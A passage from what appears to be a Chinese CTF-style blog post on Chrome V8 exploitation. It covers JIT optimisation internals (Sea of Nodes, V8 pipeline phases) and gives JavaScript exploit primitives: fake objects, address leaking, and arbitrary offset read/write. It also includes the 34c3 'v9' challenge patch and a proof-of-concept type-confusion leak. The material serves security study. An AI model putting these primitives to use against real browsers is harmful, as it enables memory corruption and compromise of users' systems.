指针指向伪造的 map</span></span><br><span class="line">spray_array[(fake_double_array_offset - spray_array_data_offset) / <span class="number">8n</span>] = <span class="title function_">u2d</span>(map_offset | <span class="number">1n</span> | (<span class="number">0x00002259n</span> &lt;&lt; <span class="number">32n</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用任意地址对象伪造漏洞（fake_object）泄露出 fake_double_array</span></span><br><span class="line"><span class="keyword">let</span> fake_double_array = <span class="title function_">trigger</span>(fake_double_array_offset | <span class="number">1n</span>);</span><br></pre></td></tr></table></figure></div>
<p><code>offset_of</code> 原语实现：我们只需要再申请一个大的 <code>ObjectArray</code>（我们称之为 <code>spray_object_array</code>）然后让伪造的 <code>DoubleArray</code> 的 <code>elements</code> 指针指向 <code>spray_object_array</code> 的 <code>elements</code>（<code>elements</code> 在沙箱内偏移固定）造成类型混淆。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2b4d01cdf3c289241c8526bdf9adbc50.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> spray_object_array = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0xf700</span>).<span class="title function_">fill</span>(&#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> object_array_element_offset = <span class="number">0x00282141n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">offset_of</span>(<span class="params">object</span>) &#123;</span><br><span class="line">    <span class="comment">// 将 object 添加到 spray_object_array 的 elements 中</span></span><br><span class="line">    spray_object_array[<span class="number">0</span>] = object;</span><br><span class="line">    <span class="comment">// fake_double_array 的 elements 指针指向 spray_object_array 的 elements</span></span><br><span class="line">    spray_array[(fake_double_array_offset - spray_array_data_offset) / <span class="number">8n</span> + <span class="number">1n</span>] = <span class="title function_">u2d</span>(object_array_element_offset | <span class="number">1n</span> | (<span class="number">0x00000002n</span> &lt;&lt; <span class="number">32n</span>));</span><br><span class="line">    <span class="comment">// 从 fake_double_array 读出 object 在沙箱中的偏移</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(fake_double_array[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>arbitrary_offset_read</code> 和 <code>arbitrary_offset_write</code> 原语实现：直接通过 <code>apray_array</code> 修改 <code>elements</code> 然后读写 <code>fake_double_array</code> 实现。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/40d6aadbb91cf5e7bab20fb3feaa8493.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_offset_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    spray_array[(fake_double_array_offset - spray_array_data_offset) / <span class="number">8n</span> + <span class="number">1n</span>] = <span class="title function_">u2d</span>((address - <span class="number">8n</span>) | <span class="number">1n</span> | (<span class="number">0x00000002n</span> &lt;&lt; <span class="number">32n</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(fake_double_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_offset_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    spray_array[(fake_double_array_offset - spray_array_data_offset) / <span class="number">8n</span> + <span class="number">1n</span>] = <span class="title function_">u2d</span>((address - <span class="number">8n</span>) | <span class="number">1n</span> | (<span class="number">0x00000002n</span> &lt;&lt; <span class="number">32n</span>));</span><br><span class="line">    fake_double_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br></pre></td></tr></table></figure></div>
<h1 id="JustinTimeCompiler"><a href="#JustinTimeCompiler" class="headerlink" title="JustinTimeCompiler"></a>JustinTimeCompiler</h1><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/4109726cb43700ba2053f1562ad5328f.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="预测优化"><a href="#预测优化" class="headerlink" title="预测优化"></a>预测优化</h2><p>Javascript是弱类型，函数参数的类型无法再翻译时确定，但是每一个函数调用，传进来的实参都有一个确定的类型，因此这个信息收集起来用来优化函数。</p>
<ul>
<li>Feedback Vector，收集参数类型<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/50fae3d29f2265768819de558d98ceff.png"
                      alt="在这里插入图片描述"
                ></li>
<li>Feedback 的变化遵循格的规律，不可逆。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/0415a8c76d1fc0c8b4211f2204eaa08f.png"
                      alt="在这里插入图片描述"
                ></li>
</ul>
<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/e0a3f6080bea3dacd16e6600bcc983e6.png"
                      alt="在这里插入图片描述"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/44b4d0ced5a0cb04a1d1e7fe92cf71e7.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="Sea-of-Nodes"><a href="#Sea-of-Nodes" class="headerlink" title="Sea of Nodes"></a>Sea of Nodes</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><h4 id="SSA-static-single-assignment"><a href="#SSA-static-single-assignment" class="headerlink" title="SSA(static single assignment)"></a>SSA(static single assignment)</h4><p>这个是 IR 的一个属性。如果一套 IR 里面，规定了所有的变量一定被且只被赋值一次，且所有的变量在使用之前都保证被定义</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">0</span>;</span><br><span class="line">a = (a + <span class="number">2</span>) * <span class="number">3</span>;</span><br><span class="line">b = a + <span class="number">2</span>;</span><br></pre></td></tr></table></figure></div>

<p>普通的 IR</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">v_a = 0</span><br><span class="line">v_a = v_a + 2</span><br><span class="line">v_a = v_a * 3</span><br><span class="line">v_b = v_a + 2</span><br></pre></td></tr></table></figure></div>

<p>SSA 的 IR</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">v_a0 = 0</span><br><span class="line">v_a1 = v_a0 + 2</span><br><span class="line">v_a2 = v_a1 * 3</span><br><span class="line">v_b = v_a2 + 2</span><br></pre></td></tr></table></figure></div>

<h4 id="CFG-Control-Flow-Graph"><a href="#CFG-Control-Flow-Graph" class="headerlink" title="CFG(Control Flow Graph)"></a>CFG(Control Flow Graph)</h4><p>控制流图是一个有向图，它的每一个结点由一个或多个指令转成。结点保证了只有在最后一条指令才能发生跳转，其他在结点里的所有指令都不会发生跳转。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/876aa00ca9fbf797dad74af35ee24c47.png"
                      alt="在这里插入图片描述"
                ></p>
<h4 id="DFG-Data-Flow-Graph"><a href="#DFG-Data-Flow-Graph" class="headerlink" title="DFG(Data Flow Graph)"></a>DFG(Data Flow Graph)</h4><p>数据流图则刻画了操作之前的数据依赖关系。图里的每一个结点都表示了一个操作，如果一个操作结点的结果被其他操作结点所使用，那么它们在数据流图里就会存在一条边。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/a6c3f2f1bcd8d4741db4e01aaf336aa3.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><p>CFG 和 DFG 从不同的层面刻画了程序。它们有交集的地方。控制流中还有一定的数据流，数据流中含有一定的控制流。直接去操纵这两者进行优化，问题会变得复杂且容易出错。<br>在 JIT 中依赖有数据依赖、Effect依赖和控制依赖 3 种。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/6cd57cf7655930c41f71d454875b90e6.png"
                      alt="在这里插入图片描述"
                ></p>
<h4 id="数据依赖"><a href="#数据依赖" class="headerlink" title="数据依赖"></a>数据依赖</h4><p>所有的计算操作都被刻画成图的结点<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/a7757ad400f4a4f570691d1c4507ee2d.png"
                      alt="在这里插入图片描述"
                ><br>没有控制流图那种严格的执行顺序，而是根据依赖关系，符合拓扑排序的所有顺序都是满足条件<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/63d6cecd17d990543b6e936e991dfa82.png"
                      alt="在这里插入图片描述"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/42918fead32d25fc816fe0a7dba91c41.png"
                      alt="在这里插入图片描述"
                ></p>
<h4 id="Effect依赖"><a href="#Effect依赖" class="headerlink" title="Effect依赖"></a>Effect依赖</h4><p>保证图中数据的读写顺序和源程序是一致的<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/fb87e78bdb0c9fe9693a237b34a8d109.png"
                      alt="在这里插入图片描述"
                ></p>
<h4 id="控制依赖"><a href="#控制依赖" class="headerlink" title="控制依赖"></a>控制依赖</h4><p>规定了程序执行的顺序，但是比常规的 CFG 要宽松。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/264e73ea57d5d707a1013a5891774fbe.png"
                      alt="在这里插入图片描述"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/0c6724735e2c145b240a8da0aa242215.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="操作符的特例化"><a href="#操作符的特例化" class="headerlink" title="操作符的特例化"></a>操作符的特例化</h3><p>在 Sea of nodes 里面，操作符有三种级别，分别是 <code>Javascript</code> ，<code>Intermediate</code> ，以及 <code>mahine</code> 。从上往下分别是从抽象到具体，越往下就表示越优化。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/139e319af448a78ffa14f66d3bf7c35c.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="JIT常见优化"><a href="#JIT常见优化" class="headerlink" title="JIT常见优化"></a>JIT常见优化</h2><h3 id="Type-and-Range-Analysis"><a href="#Type-and-Range-Analysis" class="headerlink" title="Type and Range Analysis"></a>Type and Range Analysis</h3><p>对数据的类型和范围进行分析能促进很多优化，比如bound check的去除。当操作数为两个带有 type 和 range 的结点，输出结果也往往带着 type 和 range ，且 range 是根据两个操作数的 range 和操作符进行结合。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/8cdcf2b6aa25a7360804883f46ff5a74.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="规约-Reduction"><a href="#规约-Reduction" class="headerlink" title="规约(Reduction)"></a>规约(Reduction)</h3><h4 id="常量折叠-constant-folding"><a href="#常量折叠-constant-folding" class="headerlink" title="常量折叠(constant folding)"></a>常量折叠(constant folding)</h4><p>常量折叠就是当编译器判断出一个操作的结果恒为常量时，他就会把这个操作直接用其结果进行替代。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/edbbe9d55493f65dce33639849194ccd.png"
                      alt="在这里插入图片描述"
                ></p>
<h4 id="强度折减（strength-reduction）"><a href="#强度折减（strength-reduction）" class="headerlink" title="强度折减（strength reduction）"></a>强度折减（strength reduction）</h4><p>强度折减将昂贵的运算以相同但是相对便宜的运算取代。比如用加法替代乘法，用左右移替代乘除法。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/b1b65b804708e255d79d0fce82703146.png"
                      alt="在这里插入图片描述"
                ></p>
<h4 id="Typed-Lowering"><a href="#Typed-Lowering" class="headerlink" title="Typed Lowering"></a>Typed Lowering</h4><p>Typed Lowering利用运行信息如变量类型将操作具体化，减少抽象度。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/c4bc8455ef385bb57ce005db778d5460.png"
                      alt="在这里插入图片描述"
                ></p>
<h4 id="Global-Value-Numbering"><a href="#Global-Value-Numbering" class="headerlink" title="Global Value Numbering"></a>Global Value Numbering</h4><p>本质上就是尽可能多的进行等价替代，减少重复计算。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/d31d2de344434bb35e75c755d809fb90.png"
                      alt="在这里插入图片描述"
                ></p>
<h4 id="控制优化"><a href="#控制优化" class="headerlink" title="控制优化"></a>控制优化</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/c0dc4e73512fc049511b2f31a3812b85.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="Inline"><a href="#Inline" class="headerlink" title="Inline"></a>Inline</h3><p>inline 是把一些函数调用直接替换成函数执行体。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/0b2bc6bda174951f0a1a0a389cb41531.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="Escape-Analysis"><a href="#Escape-Analysis" class="headerlink" title="Escape Analysis"></a>Escape Analysis</h3><p>决定一个对象的作用域是否被限制在当前的函数中。在 v8 中，它能减少在堆中分配对象的次数。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/be15d33251e5c3e49569356c634286a3.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="V8流水线"><a href="#V8流水线" class="headerlink" title="V8流水线"></a>V8流水线</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/3a9c0cb83fc7cfe44978281c40fcacb0.png"
                      alt="在这里插入图片描述"
                ><br>具体看 <code>v8/src/compiler/pipeline.cc</code></p>
<ul>
<li>bytecode graph builder (GraphBuilderPhase)<ul>
<li>建图，js 代码生成 sea of nodes</li>
</ul>
</li>
<li>inlining<ul>
<li>删除不会执行的代码</li>
<li>函数内联，例如把 <code>JSCall</code>(<code>MathExpm1</code>) 替换为 <code>NumberExpm1</code></li>
<li>删除死节点到活节点的边</li>
</ul>
</li>
<li>Typer<ul>
<li>将每个节点打上标签，例如数据范围和数据类型，并且计算的数据范围在接下来的所有阶段中都不会改变，也就是说接下里所有阶段的数据范围都继承自 typer 阶段</li>
</ul>
</li>
<li>typered lowering<ul>
<li>删除不会执行的代码。</li>
<li>常量折叠，例如 <code>1 + 1</code> 替换为 <code>2</code>。</li>
<li>类型优化，例如根据传入的一个参数始终为 <code>-1</code> 将 <code>SameValue</code> 替换为 <code>ObjectIsMinusZero</code>。</li>
<li>根据 typer 阶段的预测值，预测 samevalue 的返回值，如果一定返回 true 或者 false ，就把 samevalue 替换成 true 或者 false 。</li>
</ul>
</li>
<li>loop peeling<br>貌似没啥用，所以导致 typered lowering 和 load elimination 阶段效果相似。</li>
<li>load elimination<br>包含 RedundancyElimination ，根据 typer 阶段的预测值，预测 samevalue 的返回值，如果一定返回 true 或者 false，就把 samevalue 替换成 true 或者 false 。如果被优化的函数中，定义了全局的 array（前面不加 var 和 let），则根据定义的 array 中元素个数，把 checkbound 节点（checkbound 节点来源于对 array 的读写操作）的第二个输入从 loadfield 替换成“ array 中元素个数”这个常量。一般我们想要越界读写 array 都要去掉 checkbound 节点，触发“ simplified lowering 阶段去掉 checkbound 节点”优化前需要先触发“ load elimination 阶段”的这个优化。另外触发的函数的越界数组必须定义在函数内部，不能是全局的，否则 v8 无法确定数组中的元素个数。</li>
<li>escape analysis<br>把属性的值从对象中取出来。<code>LoadField</code> 从 <code>JSObject</code> 获取属性，如果获取的属性值确定，就把LoadField 替换成属性值。根据目前遇到的题目来看，escape analysis 对于不能 inline 的库函数的返回结果和另一个对象的属性进行比较之类的操作的时候会在这个阶段将属性的值从对象中取出来，否则如果有优化空间会在前一步的 load elimination 阶段将属性的值从对象中取出来同时根据预测的结果优化为常量。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/be15d33251e5c3e49569356c634286a3.png"
                      alt="在这里插入图片描述"
                ></li>
<li>simplified lowering<br>尝试对 samevalue 进行降级，因此会参考 samevalue 的两个输入预测 samevalue 的返回值，并影响后续节点的预测（但是range都没有改变）。并不会把 samevalue 替换成 true 或者 false 。根据访问范围是否始终在 Array 内决定是否去掉 CheckBounds 。</li>
</ul>
<h2 id="例题：34c3-v9"><a href="#例题：34c3-v9" class="headerlink" title="例题：34c3 v9"></a>例题：34c3 v9</h2><p><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/34c3_v9" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir v8 &amp;&amp; cd v8</span><br><span class="line">fetch v8 &amp;&amp; cd v8</span><br><span class="line">git checkout 7.6.303.28</span><br><span class="line">gclient sync</span><br><span class="line">git clone https://github.com/saelo/v9.git</span><br><span class="line">patch -p1 &lt; v9/v9_7.2.patch</span><br><span class="line">./tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div>

<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">diff --git a/src/compiler/redundancy-elimination.cc b/src/compiler/redundancy-elimination.cc</span><br><span class="line">index b91b82e766..02c1e71203 100644</span><br><span class="line">--- a/src/compiler/redundancy-elimination.cc</span><br><span class="line">+++ b/src/compiler/redundancy-elimination.cc</span><br><span class="line">@@ -26,6 +26,7 @@ Reduction RedundancyElimination::Reduce(Node* node) &#123;</span><br><span class="line">     case IrOpcode::kCheckHeapObject:</span><br><span class="line">     case IrOpcode::kCheckIf:</span><br><span class="line">     case IrOpcode::kCheckInternalizedString:</span><br><span class="line">+    case IrOpcode::kCheckMaps:</span><br><span class="line">     case IrOpcode::kCheckNotTaggedHole:</span><br><span class="line">     case IrOpcode::kCheckNumber:</span><br><span class="line">     case IrOpcode::kCheckReceiver:</span><br><span class="line">@@ -158,8 +159,8 @@ bool CheckSubsumes(Node const* a, Node const* b) &#123;</span><br><span class="line">         case IrOpcode::kCheckedUint32ToInt32:</span><br><span class="line">         case IrOpcode::kCheckedUint32ToTaggedSigned:</span><br><span class="line">         case IrOpcode::kCheckedUint64Bounds:</span><br><span class="line">-        case IrOpcode::kCheckedUint64ToInt32:</span><br><span class="line">         case IrOpcode::kCheckedUint64ToTaggedSigned:</span><br><span class="line">+        case IrOpcode::kCheckedUint64ToInt32:</span><br><span class="line">           break;</span><br><span class="line">         case IrOpcode::kCheckedFloat64ToInt32:</span><br><span class="line">         case IrOpcode::kCheckedFloat64ToInt64:</span><br><span class="line">@@ -188,6 +189,15 @@ bool CheckSubsumes(Node const* a, Node const* b) &#123;</span><br><span class="line">           &#125;</span><br><span class="line">           break;</span><br><span class="line">         &#125;</span><br><span class="line">+        case IrOpcode::kCheckMaps: &#123;</span><br><span class="line">+            // CheckMaps are compatible if the first checks a subset of the second.</span><br><span class="line">+            ZoneHandleSet&lt;Map&gt; const&amp; a_maps = CheckMapsParametersOf(a-&gt;op()).maps();</span><br><span class="line">+            ZoneHandleSet&lt;Map&gt; const&amp; b_maps = CheckMapsParametersOf(b-&gt;op()).maps();</span><br><span class="line">+            if (!b_maps.contains(a_maps)) &#123;</span><br><span class="line">+                return false;</span><br><span class="line">+            &#125;</span><br><span class="line">+            break;</span><br><span class="line">+        &#125;</span><br><span class="line">         default:</span><br><span class="line">           DCHECK(!IsCheckedWithFeedback(a-&gt;op()));</span><br><span class="line">           return false;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>分析 diff 文件，发现增加了 <code>kCheckMaps</code> 的 reduce 优化，这个优化的作用是合并两个 <code>kCheckMaps</code> 操作，而合并的条件是前一个 <code>kCheckMaps</code> 的判断条件包含了后一个 <code>kCheckMaps</code> 的全部判断条件。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">CheckSubsumes</span><span class="params">(Node <span class="type">const</span>* a, Node <span class="type">const</span>* b)</span> </span>&#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="keyword">switch</span> (a-&gt;<span class="built_in">opcode</span>()) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">case</span> IrOpcode::kCheckMaps: &#123;</span><br><span class="line">            <span class="comment">// CheckMaps are compatible if the first checks a subset of the second.</span></span><br><span class="line">            ZoneHandleSet&lt;Map&gt; <span class="type">const</span>&amp; a_maps = <span class="built_in">CheckMapsParametersOf</span>(a-&gt;<span class="built_in">op</span>()).<span class="built_in">maps</span>();</span><br><span class="line">            ZoneHandleSet&lt;Map&gt; <span class="type">const</span>&amp; b_maps = <span class="built_in">CheckMapsParametersOf</span>(b-&gt;<span class="built_in">op</span>()).<span class="built_in">maps</span>();</span><br><span class="line">            <span class="keyword">if</span> (!b_maps.<span class="built_in">contains</span>(a_maps)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Node* RedundancyElimination::EffectPathChecks::<span class="built_in">LookupCheck</span>(Node* node) <span class="type">const</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (Check <span class="type">const</span>* check = head_; check != <span class="literal">nullptr</span>; check = check-&gt;next) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">CheckSubsumes</span>(check-&gt;node, node) &amp;&amp; <span class="built_in">TypeSubsumes</span>(node, check-&gt;node)) &#123;</span><br><span class="line">      <span class="built_in">DCHECK</span>(!check-&gt;node-&gt;<span class="built_in">IsDead</span>());</span><br><span class="line">      <span class="keyword">return</span> check-&gt;node;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Reduction <span class="title">RedundancyElimination::ReduceCheckNode</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  Node* <span class="type">const</span> effect = NodeProperties::<span class="built_in">GetEffectInput</span>(node);</span><br><span class="line">  EffectPathChecks <span class="type">const</span>* checks = node_checks_.<span class="built_in">Get</span>(effect);</span><br><span class="line">  <span class="comment">// If we do not know anything about the predecessor, do not propagate just yet</span></span><br><span class="line">  <span class="comment">// because we will have to recompute anyway once we compute the predecessor.</span></span><br><span class="line">  <span class="keyword">if</span> (checks == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">  <span class="comment">// See if we have another check that dominates us.</span></span><br><span class="line">  <span class="keyword">if</span> (Node* check = checks-&gt;<span class="built_in">LookupCheck</span>(node)) &#123;</span><br><span class="line">    <span class="built_in">ReplaceWithValue</span>(node, check);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Replace</span>(check);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Learn from this check.</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">UpdateChecks</span>(node, checks-&gt;<span class="built_in">AddCheck</span>(<span class="built_in">zone</span>(), node));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Reduction <span class="title">RedundancyElimination::Reduce</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (node_checks_.<span class="built_in">Get</span>(node)) <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">  <span class="keyword">switch</span> (node-&gt;<span class="built_in">opcode</span>()) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kCheckMaps:</span><br><span class="line">    ...</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">ReduceCheckNode</span>(node);</span><br></pre></td></tr></table></figure></div>
<p>因此如果两次 <code>kCheckMaps</code> 之间如果一直没有修改 <code>map</code> 那么经过 JIT 优化后后一个 <code>kCheckMaps</code> 会被去除，而此时如果修改了 <code>map</code> 则由于缺少对 <code>map</code> 的检查导致类型混淆。<br>poc 如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">address_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">        <span class="comment">// Generate first MapCheck</span></span><br><span class="line">        a[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// This callback could change the Map ...</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">        <span class="comment">// ... but this MapCheck will still be removed ¯\_(ツ)_/¯</span></span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">evil_callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">        a[<span class="number">0</span>] = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">trigger</span>(<span class="function">() =&gt;</span> &#123; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(<span class="title function_">trigger</span>(evil_callback));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">address_of</span>(array_buffer)));</span><br><span class="line"></span><br><span class="line">% <span class="title class_">DebugPrint</span>(array_buffer);</span><br></pre></td></tr></table></figure></div>

<p>首先定位 <code>kCheckMaps</code> 所在的优化的阶段。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/94f0d91ba598e5835839fc547519d972.png"
                      alt="在这里插入图片描述"
                ><br>选择最早的优化阶段，最终确定是在 <code>V8.TFLoadElimination</code> 阶段调用的此优化。</p>
